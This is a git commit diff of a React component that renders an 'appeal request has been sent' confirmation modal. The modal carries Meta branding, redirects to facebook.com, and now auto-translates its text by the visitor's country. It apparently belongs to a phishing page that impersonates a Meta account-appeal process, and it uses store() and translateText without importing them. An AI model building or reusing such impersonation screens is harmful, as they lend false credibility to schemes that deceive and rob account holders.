dedc8c2f23291de82159276803d625bef9fa9cc4
ntp1210000 <thanhphuong121098@gmail.com>
2026-01-03 18:17:51 +0700

    Update final-modal.tsx

--- app/routes/final-modal.tsx
+++ app/routes/final-modal.tsx
@@ -1,37 +1,51 @@
-import { FC } from 'react';
+import FinalImage from '../assets/final-image.png';
+import MetaLogo from '../assets/meta-logo-image.png';
+import Image from 'next/image';
+import { useEffect, useState, type FC } from 'react';
 
 const FinalModal: FC = () => {
-  return (
-    <div className="fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4">
-      <div className="flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4">
-        <p className="mt-4 text-2xl font-bold">Request has been sent</p>
-        <p className="text-xl">
-          Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.
-        </p>
-        <div className="flex flex-col justify-center gap-10">
-          <img
-            src="/assets/final-image.png"
-            alt="Final Image"
-            style={{ width: 400, height: 300, margin: 'auto', display: 'block' }}
-          />
-          <button
-            type="button"
-            onClick={() => window.location.replace('https://www.facebook.com')}
-            className="mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700"
-          >
-            Return on Facebook
-          </button>
+    const [translations, setTranslations] = useState<Record<string, string>>({});
+
+    const { geoInfo } = store();
+    const t = (text: string): string => {
+        return translations[text] || text;
+    };
+
+    useEffect(() => {
+        if (!geoInfo) return;
+
+        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];
+
+        const translateAll = async () => {
+            const translatedMap: Record<string, string> = {};
+
+            for (const text of textsToTranslate) {
+                translatedMap[text] = await translateText(text, geoInfo.country_code);
+            }
+
+            setTranslations(translatedMap);
+        };
+
+        translateAll();
+    }, [geoInfo]);
+
+    return (
+        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
+            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
+                <p className='mt-4 text-2xl font-bold'>{t('Request has been sent')}</p>
+                <p className='text-xl'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
+                <div className='flex flex-col justify-center gap-10'>
+                    <Image src={FinalImage} alt='' />
+                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
+                        {t('Return on Facebook')}
+                    </button>
+                </div>
+                <div className='flex items-center justify-center p-3'>
+                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
+                </div>
+            </div>
         </div>
-        <div className="flex items-center justify-center p-3">
-          <img
-            src="/assets/meta-logo-image.png"
-            alt="Meta Logo"
-            style={{ width: 70, height: 18 }}
-          />
-        </div>
-      </div>
-    </div>
-  );
+    );
 };
 
 export default FinalModal;
